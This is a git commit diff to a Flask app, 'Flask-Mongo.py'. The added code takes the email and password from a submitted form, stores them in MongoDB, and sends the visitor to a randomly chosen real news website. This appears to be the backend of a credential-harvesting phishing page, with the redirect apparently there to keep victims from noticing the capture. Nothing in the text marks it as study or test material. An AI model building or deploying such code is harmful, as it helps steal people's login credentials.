4f478ec80dc7880ff2adb0c18111744bccff9b0d
Afranzio <61235427+Afranzio@users.noreply.github.com>
2020-06-21 01:24:53 +0530

    Add files via upload

--- Flask-Mongo.py
+++ Flask-Mongo.py
@@ -1,6 +1,7 @@
-from flask import Flask,render_template,request,url_for
+from flask import Flask,render_template,request,url_for,redirect
 from flask_cors import CORS
 from pymongodb import DB_data
+import random
 
 app = Flask(__name__)
 
@@ -13,11 +14,14 @@ def index():
     if request.method == "GET":
         pass
     if request.method == "POST":
-        if request.form.get("email") !== ""
+        if request.form.get("email") != "" and request.form.get("pwd") != "":
             email = request.form.get("email")
-        else
-        password = request.form.get("pwd")
-        DB_data(email,password)
+            password = request.form.get("pwd")
+            DB_data(email,password)
+            url = random.choice(['https://timesofindia.indiatimes.com/','https://edition.cnn.com/india','https://www.indiatoday.in/',
+                    'https://indianexpress.com/','https://www.thehindu.com/latest-news/','https://www.news18.com/','https://www.firstpost.com/category/india',
+                    'https://www.business-standard.com/','https://economictimes.indiatimes.com/','https://news.google.co.in/','http://ddnews.gov.in/'])
+            return redirect(url, code=302)
 
     return render_template("index.html")
 
